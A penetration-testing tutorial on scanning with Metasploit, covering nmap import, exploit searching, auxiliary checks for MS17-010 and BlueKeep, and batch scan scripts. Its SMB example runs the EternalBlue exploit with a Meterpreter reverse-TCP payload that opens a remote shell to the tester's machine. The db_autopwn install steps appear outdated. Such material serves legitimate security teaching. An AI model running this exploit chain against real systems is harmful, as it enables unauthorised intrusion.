# Vulnerability Scanning with Metasploit Framework

## Overview

This guide covers comprehensive vulnerability scanning techniques using Metasploit Framework, including manual module usage, automated plugins, and integration with external tools.

## Initial Setup

### Environment Configuration

```bash
# Start PostgreSQL database
sudo systemctl start postgresql

# Launch Metasploit Framework
msfconsole

# Verify database connection
db_status

# Create dedicated workspace
workspace -a vulnerability_scanning

# Set global RHOSTS variable
setg RHOSTS <target_ip>
```

## Service Discovery and Enumeration

### Nmap Integration

```bash
# Perform comprehensive scan and import results
db_nmap -sS -sV -O <target_ip>

# Alternative: Scan specific port ranges
db_nmap -p 1-1000 -sV <target_ip>

# Verify imported data
hosts
services
```

### Manual Service Analysis

```bash
# View discovered services
services

# Filter specific services
services -p 445,3389,80

# Get detailed host information
hosts -R
```

## Manual Vulnerability Identification

### Service Version-Based Searching

```bash
# Search for exploits by service name
search type:exploit name:iis

# Search by version information
search type:exploit name:"Windows SMB"

# Filter results by platform
search type:exploit platform:windows
```

### External Exploit Database Integration

```bash
# Using searchsploit for external research
searchsploit "Windows SMB" | grep "Metasploit"

# Search for specific CVE
searchsploit CVE-2017-0143

# Limit to Metasploit modules only
searchsploit "Windows SMB" | grep "Metasploit"
```

## Automated Vulnerability Scanning

### DB Autopwn Plugin Installation

```bash
# Download the plugin
wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/plugins/db_autopwn.rb

# Install to Metasploit plugins directory
sudo cp db_autopwn.rb /usr/share/metasploit-framework/plugins/

# Load the plugin
load db_autopwn
```

### Using DB Autopwn

```bash
# Scan all open ports for exploits
db_autopwn -p -t

# Target specific ports only
db_autopwn -p -t -I 445,3389

# Show matching modules without executing
db_autopwn -p -t --show
```

## Vulnerability Verification

### Auxiliary Scanner Modules

```bash
# Check for MS17-010 vulnerability
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <target_ip>
run

# Verify RDP vulnerabilities
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <target_ip>
run
```

### Manual Exploit Testing

```bash
# Test EternalBlue vulnerability
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <kali_ip>
set LPORT 4444
check
```

## Advanced Analysis Techniques

### Database Analysis Command

```bash
# Analyze database for potential exploits
analyze

# Analyze specific host
analyze -h <target_ip>

# Show vulnerability details
vulns
```

### Custom Search Scripts

```bash
#!/bin/bash
# vulnerability_scanner.sh
TARGET=$1

echo "[*] Starting vulnerability scan for $TARGET"

# Service discovery
msfconsole -q -x "
workspace -a scan_$TARGET;
setg RHOSTS $TARGET;
db_nmap -sS -sV $TARGET;
services;
exit"

# Vulnerability analysis
msfconsole -q -x "
workspace scan_$TARGET;
analyze;
vulns;
exit"
```

## Practical Example: SMB Vulnerability Chain

### Step 1: Service Discovery

```bash
db_nmap -p 445 -sV --script smb-os-discovery <target_ip>
```

### Step 2: Vulnerability Verification

```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <target_ip>
run

# Output: Host is likely VULNERABLE to MS17-010!
```

### Step 3: Exploit Execution

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <kali_ip>
exploit

# Successful exploitation provides meterpreter session
```

## Web Application Vulnerability Scanning

### WMAP Plugin Usage

```bash
# Load WMAP plugin
load wmap

# Configure targets
wmap_sites -a <target_ip>
wmap_targets -t http://<target_ip>/
wmap_run -e
```

### Manual Web Service Testing

```bash
# Check for common web vulnerabilities
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/dir_scanner
```

## Integration with External Tools

### Searchsploit Automation

```bash
#!/bin/bash
# automated_exploit_search.sh
SERVICE=$1
VERSION=$2

echo "[*] Searching exploits for $SERVICE $VERSION"
searchsploit "$SERVICE $VERSION" | grep -E "(Metasploit|www)"

# Output results to file
searchsploit "$SERVICE $VERSION" -j > exploits.json
```

### Metasploit Module Validation

```bash
# Verify module compatibility
use <exploit_module>
info

# Check module options
show options

# Test without exploitation
check
```

## Best Practices and Optimization

### Efficient Scanning Techniques

```bash
# Prioritize high-value services
services -p 21,22,80,443,445,3389

# Use threaded scanning for multiple hosts
set THREADS 10

# Implement scan timing controls
set TIMEOUT 5
```

### Resource Management

```bash
# Clean up workspace regularly
workspace -d old_scan

# Export important results
db_export -f xml scan_results.xml

# Maintain scan history
workspace -l
```

## Real-World Usage Examples

### Dynamic Target Scanning

```bash
#!/bin/bash
# dynamic_vulnerability_scan.sh
TARGET_FILE="targets.txt"

while IFS= read -r target; do
    echo "[*] Scanning $target"
    msfconsole -q -x "
        workspace -a scan_$target;
        setg RHOSTS $target;
        db_nmap -sS -sV $target;
        analyze;
        db_export -f xml ${target}_results.xml;
        exit"
done < "$TARGET_FILE"
```

### Service-Specific Scanning

```bash
# SMB vulnerability assessment
msfconsole -q -x "
workspace smb_scan;
setg RHOSTS <target_ip>;
use auxiliary/scanner/smb/smb_version;
run;
use auxiliary/scanner/smb/smb_ms17_010;
run;
use auxiliary/scanner/smb/smb_enumshares;
run;
exit"
```

## Troubleshooting Common Issues

### Database Connectivity

```bash
# Reset database connection
db_disconnect
db_connect

# Reimport scan data
db_import nmap_scan.xml
```

### Module Loading Problems

```bash
# Reload all modules
reload_all

# Update Metasploit
msfupdate

# Check module dependencies
info <module_path>
```

## Key Takeaways

1. **Comprehensive Enumeration**: Always start with thorough service discovery
2. **Targeted Searching**: Use specific version information for precise results
3. **Verification Before Exploitation**: Always use check commands when available
4. **Database Integration**: Leverage Metasploit's database for efficient workflow
5. **External Tool Integration**: Combine with searchsploit for comprehensive coverage
6. **Automation**: Create scripts for repetitive scanning tasks

This methodology provides a systematic approach to vulnerability scanning with Metasploit Framework, enabling efficient identification and verification of exploitable vulnerabilities in target systems.
